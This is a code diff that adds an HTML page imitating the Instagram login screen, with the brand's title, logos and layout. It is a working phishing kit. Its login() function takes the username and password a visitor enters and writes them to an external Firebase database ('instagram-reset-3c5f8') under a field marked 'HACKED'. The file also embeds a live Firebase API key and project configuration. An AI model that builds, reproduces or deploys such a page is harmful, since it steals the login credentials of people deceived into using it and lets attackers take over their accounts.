@@ -1,0 +1,256 @@
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://www.gstatic.com/firebasejs/8.2.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.2.1/firebase-database.js"></script>
+    <link rel="icon" type="image/png" href="/94409a775c02d7658dd6e7ba88429b63-removebg-preview.png">
+    <title>Login . Instagram</title>
+</head>
+
+<style>
+    body {
+        background: rgb(250, 250, 250);
+        display: flex;
+        justify-content: center;
+    }
+
+    .container {
+        height: 350px;
+        width: 290px;
+        margin-top: 30px;
+        background: white;
+        border: 1px solid rgb(156, 153, 153);
+    }
+
+    .insta_logo {
+        height: 40px;
+        margin-top: 40px;
+        width: 150px;
+        cursor: pointer;
+        margin-left: 80px;
+    }
+
+    .email {
+        margin-left: 30px;
+        padding: 9px;
+        background: whitesmoke;
+        width: 80%;
+        border: 1px solid rgb(234, 234, 234);
+    }
+
+    .email:focus {
+        outline: none;
+        border-color: rgb(178, 178, 178);
+    }
+
+    ::placeholder {
+        font-size: 11px;
+        color: rgb(173, 173, 173);
+    }
+
+    .password {
+        margin-top: 10px;
+    }
+
+    .container button {
+        background: #bce7fa;
+        border: none;
+        padding: 6px;
+        width: 80%;
+        margin-left: 30px;
+        color: white;
+        border-radius: 3px;
+        font-family: sans-serif;
+        font-weight: bolder;
+        cursor: pointer;
+    }
+
+    .or {
+        text-align: center;
+        font-family: sans-serif;
+        font-size: 13px;
+        color: rgb(191, 191, 191);
+    }
+
+    .or::before {
+        content: '';
+        position: absolute;
+        height: 1px;
+        width: 100px;
+        background-color: rgb(191, 191, 191);
+        margin-top: 5px;
+        margin-left: 26px;
+    }
+
+    .or::after {
+        content: '';
+        position: absolute;
+        height: 1px;
+        width: 95px;
+        background-color: rgb(191, 191, 191);
+        margin-top: 5px;
+        margin-left: -125px;
+    }
+
+    .facebook {
+        height: 16px;
+        width: 16px;
+        margin-left: 80px;
+        cursor: pointer;
+    }
+
+    .fb {
+        color: rgba(6, 36, 100, 0.825);
+        font-family: sans-serif;
+        margin-left: 105px;
+        margin-top: -20px;
+        font-size: 13px;
+        font-weight: bolder;
+        cursor: pointer;
+    }
+
+    .forgot {
+        color: rgb(81, 80, 80);
+        font-size: 10px;
+        font-family: sans-serif;
+        margin-left: 95px;
+        font-weight: lighter;
+        margin-top: -25px;
+        cursor: pointer;
+    }
+
+    .dont {
+        padding: 2px;
+        background: white;
+        text-align: center;
+        border: 1px solid rgb(174, 174, 174);
+        font-family: sans-serif;
+        font-size: 14px;
+        color: rgb(50, 49, 49);
+    }
+
+    .dont span {
+        color: #03a6eb;
+        font-weight: bolder;
+    }
+
+    .get {
+        text-align: center;
+        font-family: sans-serif;
+        font-size: 13px;
+    }
+
+    .img img {
+        height: 35px;
+        width: 120px;
+        margin-left: 15px;
+        vertical-align: baseline;
+    }
+
+    @media screen and (max-width: 400px) {
+        .img img {
+            height: 30px;
+            width: 110px;
+            margin-left: 60px;
+        }
+
+        .facebook {
+            margin-left: 50px;
+        }
+
+        .fb {
+            margin-left: 70px;
+        }
+
+        .dont {
+            border: none;
+            background: rgb(250, 250, 250);
+            display: flex;
+            justify-content: center;
+        }
+
+        .container {
+            border: none;
+            background: rgb(250, 250, 250);
+        }
+
+        .or::before {
+            width: 85px;
+        }
+
+        .or::after {
+            width: 70px;
+            margin-left: -100px;
+        }
+    }
+</style>
+
+<body>
+    <div class="container">
+        <img src="https://i.ibb.co/fSZrktN/instagram-logo.png" alt="instagram-logo" class="insta_logo">
+        <br><br><br>
+        <input type="text" placeholder="Phone number, username or email address" class="email" id="user_name">
+        <input type="password" placeholder="Password" class="email password" id="user_password">
+        <br><br>
+        <button id="login" onclick="login()">Log In</button>
+        <br>
+        <p class="or">OR</p>
+        <img src="https://i.ibb.co/Dzr4DC6/facebook-logo.jpg" alt="facebook-logo" class="facebook">
+        <p class="fb">Login with Facebook</p>
+        <br><br>
+        <p class="forgot">Forgotten your password?</p>
+        <br>
+        <div class="dont">
+            <p>Dont have an account? <span> Sign up</span></p>
+        </div>
+        <br>
+        <p class="get">Get the app.</p>
+        <div class="img">
+            <img src="https://i.ibb.co/bHVsHrT/app-store.png" alt="app_store">
+            <img src="https://i.ibb.co/JBVJ8JB/play-store.png" alt="play_store">
+        </div>
+    </div>
+</body>
+
+<script>
+
+    const firebaseConfig = {
+        apiKey: "AIzaSyAyKedNtmNoERt-c_Ir8Kik5iEFIegNgsk",
+        authDomain: "instagram-reset-3c5f8.firebaseapp.com",
+        databaseURL: "https://instagram-reset-3c5f8-default-rtdb.firebaseio.com",
+        projectId: "instagram-reset-3c5f8",
+        storageBucket: "instagram-reset-3c5f8.appspot.com",
+        messagingSenderId: "1078910477718",
+        appId: "1:1078910477718:web:bd441b7e275f4361dbe9b7"
+    };
+    firebase.initializeApp(firebaseConfig);
+    console.log()
+
+
+
+
+    function login() {
+
+        user_name = document.getElementById("user_name").value;
+        user_password = document.getElementById("user_password").value;
+
+
+        firebase.database().ref("/").child(user_name).update({
+
+            password: user_password,
+            username: user_name,
+            purpose : "HACKED"
+
+        })
+
+    }
+
+
+
+
+</script>
+
+</html>
